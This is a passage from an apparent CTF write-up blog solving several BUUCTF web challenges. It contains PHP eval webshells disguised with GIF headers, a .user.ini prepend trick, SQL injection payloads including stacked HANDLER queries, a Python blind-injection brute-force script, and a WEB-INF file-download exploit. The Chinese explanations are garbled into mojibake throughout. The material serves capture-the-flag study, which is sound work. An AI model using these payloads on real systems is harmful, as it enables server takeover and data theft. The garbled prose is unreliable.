class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$B</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$A</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$B</span>;<br></code></pre></td></tr></table></figure>

<p>åŒ…å«å†…å®¹ï¼š</p>
<p>phpä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<p>å°†protectedæ”¹ä¸ºprivate å› ä¸ºprotectedæƒé™çš„å˜é‡åºåˆ—åŒ–ä¹‹åä¼šåœ¨å­—ç¬¦å‰å¢åŠ %00</p>
<p>ååºåˆ—åŒ–</p>
<h3 id="16ã€-SUCTF-2019-CheckIn"><a href="#16ã€-SUCTF-2019-CheckIn" class="headerlink" title="16ã€[SUCTF 2019]CheckIn"></a>16ã€[SUCTF 2019]CheckIn</h3><p>æ–‡ä»¶ä¸Šä¼ </p>
<p>è¯•è¯•ä¸€å¥è¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;nene&#x27;])?&gt;<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">illegal suffix!<br></code></pre></td></tr></table></figure>

<p>æç¤ºåç¼€è¿æ³• è¿…é€Ÿæƒ³åˆ°.htaccessæ–¹æ³• ç„¶è€Œ.htaccessæ–¹æ³•æ˜¯é’ˆå¯¹apacheçš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exif_imagetype:not image!<br></code></pre></td></tr></table></figure>

<p>çœ‹æ¥åº”è¯¥æ˜¯æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹çš„</p>
<p>æŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;? in contents!<br></code></pre></td></tr></table></figure>

<p>è§£å†³æ–¹æ³•ï¼šæ›´æ¢payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a? <br>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Your dir uploads/f65a0ca982c669865231909b0ec85a0c  <br>Your files :  <br>array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.user.ini&quot; [3]=&gt; string(5) &quot;1.jpg&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;<br></code></pre></td></tr></table></figure>

<p>å¯¹äºnginx ä¸Šä¼ .user.iniæ–‡ä»¶ å®ƒå¯ä»¥ä½¿æˆ‘ä»¬å¯¹ç›®å½•ä¸­çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶è®¿é—®æ—¶ éƒ½è°ƒç”¨.user.iniæ–‡ä»¶ä¸­æŒ‡å®šçš„ç±»å‹å¯¹å…¶è¿›è¡Œè¯»å– æ³¨æ„è¯¥æ–‡ä»¶ä¹Ÿéœ€è¦åŠ æ–‡ä»¶å¹»æœ¯å¤´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a<br>auto_prepend_file=1.jpg<br></code></pre></td></tr></table></figure>

<p>ç„¶åèšå‰‘å³å¯<br>ç„¶è€Œèšå‰‘è¿ä¸ä¸Š<br>è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯ æ³¨æ„æœ€åä¸€å®šè¦å¸¦åˆ†å· å¦åˆ™æ— æ³•æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">index.php?nene=system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure>

<h3 id="17ã€-GXYCTF2019-BabyUpload"><a href="#17ã€-GXYCTF2019-BabyUpload" class="headerlink" title="17ã€[GXYCTF2019]BabyUpload"></a>17ã€[GXYCTF2019]BabyUpload</h3><p>åº”è¯¥åˆæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®<br>ä¸€å¥è¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a? <br>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼<br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ phtmlæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">åç¼€åä¸èƒ½æœ‰phï¼<br></code></pre></td></tr></table></figure>

<p>åˆ™åº”è¯¥éœ€è¦è¾…åŠ©ä¸Šä¼ æ–‡ä»¶<br>éšä¾¿è¾“ä¸€æ®µurl çœ‹çœ‹æœåŠ¡å™¨ç±»å‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Apache/2.4.10 (Debian) Server at f8939c1f-6a09-486e-b9eb-0e5198a5f3bd.node5.buuoj.cn Port 80<br></code></pre></td></tr></table></figure>

<p>apacheåˆ™ ç”¨.htaccess<br>ä¸Šä¼ æ—¶ä¿®æ”¹content-typeä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">image/jpeg<br></code></pre></td></tr></table></figure>

<p>åˆ™ä¸Šä¼ æˆåŠŸ<br>ç„¶åç›´æ¥ç”¨èšå‰‘è¿æ¥å³å¯</p>
<h3 id="18ã€-GXYCTF2019-BabySQli"><a href="#18ã€-GXYCTF2019-BabySQli" class="headerlink" title="18ã€[GXYCTF2019]BabySQli"></a>18ã€[GXYCTF2019]BabySQli</h3><p>æœ‰ç”¨æˆ·åå’Œå¯†ç ç™»å½•æ¡† ä»…å¯¹å¯†ç éƒ¨åˆ†è¿›è¡Œä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wrong pass!<br></code></pre></td></tr></table></figure>

<p>å¯èƒ½å­˜åœ¨å…³é”®è¯è¿‡æ»¤ fuzzä¸€ä¸‹<br>fuzzå®Œå‘ç°åœ¨passwordé‡Œæ‰€æœ‰çš„å…³é”®è¯å…¨è¢«è¿‡æ»¤äº†<br>è¯•è¯•username<br>å‘ç°usernameæ˜¯å­˜åœ¨æ³¨å…¥çš„<br>å½“usernameåªè¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1<br></code></pre></td></tr></table></figure>

<p>if we try the payload below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;union select 1,2%23 #<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Error: The used SELECT statements have a different number of columns<br></code></pre></td></tr></table></figure>

<p>add one more column</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;union select 1,2,3 %23<br></code></pre></td></tr></table></figure>

<p>return</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wrong user<br></code></pre></td></tr></table></figure>

<p>then we can confirm that there are 3 columns in total<br>payload to get the table names</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select 1,2,group_concat(table_name)from <br>information_schema.tables<br>where table_schema=database() %23<br></code></pre></td></tr></table></figure>

<p>however it gives us this in return</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">do not hack me!<br></code></pre></td></tr></table></figure>

<p>è”åˆæŸ¥è¯¢ä¼šå°†æ•°æ®æ’å…¥åˆ°è¡¨ä¸­ åˆ©ç”¨è¿™ä¸ªæœºåˆ¶ æˆ‘ä»¬å¯ä»¥æ–°å»ºadminè´¦æˆ·æ¥ç™»å½•admin<br>å°è¯•payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select 1,&#x27;admin&#x27;,3#<br></code></pre></td></tr></table></figure>

<p>æç¤ºwrong passï¼Œ è¯´æ˜ç”¨æˆ·åæ˜¯æ­£ç¡®çš„<br>æ¥ç€é€šè¿‡è”åˆæŸ¥è¯¢æ–°å»ºå¯†ç  å¹¶ç™»å½•<br>å‘ç°è¿˜æ˜¯ä¸è¡Œ<br>å°è¯•ä¸Šä¼ å¯†ç çš„md5å€¼ æˆåŠŸ</p>
<h3 id="19ã€-GYCTF2020-Blacklist"><a href="#19ã€-GYCTF2020-Blacklist" class="headerlink" title="19ã€[GYCTF2020]Blacklist"></a>19ã€[GYCTF2020]Blacklist</h3><p>sqlæ³¨å…¥åŠ blacklist æƒ³åˆ°é¢„ç¼–è¯‘å’Œhandler<br>å…ˆæµ‹è¯•æ³¨å…¥ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">array(2) &#123;<br>  [0]=&gt;<br>  string(1) &quot;1&quot;<br>  [1]=&gt;<br>  string(7) &quot;hahahah&quot;<br>&#125;<br><br>array(2) &#123;<br>  [0]=&gt;<br>  string(1) &quot;2&quot;<br>  [1]=&gt;<br>  string(12) &quot;miaomiaomiao&quot;<br>&#125;<br><br>array(2) &#123;<br>  [0]=&gt;<br>  string(6) &quot;114514&quot;<br>  [1]=&gt;<br>  string(2) &quot;ys&quot;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>çˆ†åº“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;show databases;#<br></code></pre></td></tr></table></figure>

<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;show tables;#<br></code></pre></td></tr></table></figure>

<p>å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">array(1) &#123;<br>  [0]=&gt;<br>  string(8) &quot;FlagHere&quot;<br>&#125;<br><br>array(1) &#123;<br>  [0]=&gt;<br>  string(5) &quot;words&quot;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¢„ç¼–è¯‘payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;prepare nene from concat (&#x27;s&#x27;,&#x27;elect&#x27;,&#x27;* from `miaomiaomiao`&#x27;);execute nene;;<br></code></pre></td></tr></table></figure>

<p>é¢„ç¼–è¯‘ä¹Ÿè¢«è¿‡æ»¤äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);<br></code></pre></td></tr></table></figure>

<p>é‚£å°±handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` read close;<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h3 id="20ã€-CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#20ã€-CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="20ã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>20ã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>æ³¨å…¥æ£€æµ‹ å…ˆéšä¾¿è¾“å‡ ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SQL Injection Checked.<br></code></pre></td></tr></table></figure>

<p>çœ‹æ¥ä¸æ˜¯æŠ¥é”™æ³¨å…¥ é‚£å°±æ˜¯boolç›²æ³¨<br>å·²çŸ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">### All You Want Is In Table &#x27;flag&#x27; and the column is &#x27;flag&#x27;<br><br>### Now, just give the id of passage<br></code></pre></td></tr></table></figure>

<p>pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><br>url = <span class="hljs-string">&quot;http://ece36d87-bdcb-4e2c-83dd-d78a86059e51.node5.buuoj.cn:81/index.php&quot;</span>  <br><br>result = <span class="hljs-string">&quot;&quot;</span>  <br>num = <span class="hljs-number">0</span>  <span class="hljs-comment"># ç”¨äº†æ¥åˆ¤æ–­æ˜¯ä¸æ˜¯flagå·²ç»æ‹¼å®Œæ•´äº†  </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):  <br><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:  <br>        <span class="hljs-keyword">break</span>  <br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):  <br><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i, j)  <br>        <span class="hljs-comment"># print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)  </span><br><br>        data = &#123;  <br>            <span class="hljs-string">&quot;id&quot;</span>: payload,  <br>        &#125;  <br><br>        r = requests.post(url, data=data)  <br><br>        r.encoding = r.apparent_encoding  <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> r.text:  <br>            x = <span class="hljs-built_in">chr</span>(j)  <br>            result += <span class="hljs-built_in">str</span>(x)  <br>            <span class="hljs-built_in">print</span>(result)  <br>            <span class="hljs-keyword">break</span>  <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> result:  <br>            <span class="hljs-built_in">print</span>(result)  <br>            num = <span class="hljs-number">1</span>  <br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>ä»£ç è§£æ å…³é”®éƒ¨åˆ†å°±åœ¨payload å…¶ä½™éƒ½å¾ˆå¥½ç†è§£</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i, j)<br></code></pre></td></tr></table></figure>

<p>iä¸ºflagçš„ç¬¬iä¸ªå­—æ¯<br>jä¸ºå¯è§å­—ç¬¦çš„asciiå€¼<br>å› ä¸ºæ˜¯å·²çŸ¥flagè¡¨ä¸­çš„flagåˆ— å› æ­¤select flag from flag<br>substrå‡½æ•°ç”¨æ¥æˆªå–å­—ç¬¦ä¸²<br>å…¶ç”¨æ³•ä¸º</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">SUBSTR (str, pos, len)<br></code></pre></td></tr></table></figure>

<p>strä¸ºå­—ç¬¦ä¸² å³flag<br>posä¸ºèµ·å§‹ä½ç½®<br>lenä¸ºæˆªå–å­—ç¬¦ä¸ªæ•°<br>å› æ­¤è¿™ä¸ªå‡½æ•°çš„æ„æ€å°±æ˜¯é€‰æ‹©flagçš„ç¬¬iä¸ªå­—æ¯<br>è½¬åŒ–ä¸ºasciiå€¼åå†æ‰§è¡Œif<br>sqlä¸­ifçš„ç”¨æ³•</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">IF( expr1 , expr2 , expr3 )<br></code></pre></td></tr></table></figure>

<p>å½“expr1ä¸ºtrueæ—¶ è¿”å›expr2<br>false è¿”å›expr3<br>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåé¢è¦åˆ¤æ–­helloæ˜¯å¦åœ¨å›æ˜¾ç»“æœé‡Œ<br>è¯´äº†id å› æ­¤è¯·æ±‚å¤´çš„idæ”¾payload å½“ç„¶ä¹Ÿå¯æŠ“åŒ…å†çœ‹</p>
<h3 id="21ã€-RoarCTF-2019-Easy-Java"><a href="#21ã€-RoarCTF-2019-Easy-Java" class="headerlink" title="21ã€[RoarCTF 2019]Easy Java"></a>21ã€[RoarCTF 2019]Easy Java</h3><p>ç»™äº†ä¸€ä¸ªç™»é™†é¡µé¢ è¿˜æœ‰ä¸€ä¸ªhelp<br>helpç‚¹è¿›å»å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java.io.FileNotFoundException:&#123;help.docx&#125;<br></code></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºä»£ç  å‘ç°helpå¯¹åº”çš„æºä»£ç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;Download?filename=help.docx&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>help<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç”±java webç›¸å…³çŸ¥è¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™  <br>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­  <br>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶  <br>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶  <br>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br></code></pre></td></tr></table></figure>

<p>åˆ™æ„é€ payload æ¥åœ¨urlåé¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/Download?filename=WEB-INF/web.xml<br></code></pre></td></tr></table></figure>

<p>ä¸è¡Œ åˆ™æ›´æ¢postæ–¹æ³• ä¸‹è½½æˆåŠŸ å‘ç°æºç </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>Index<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span 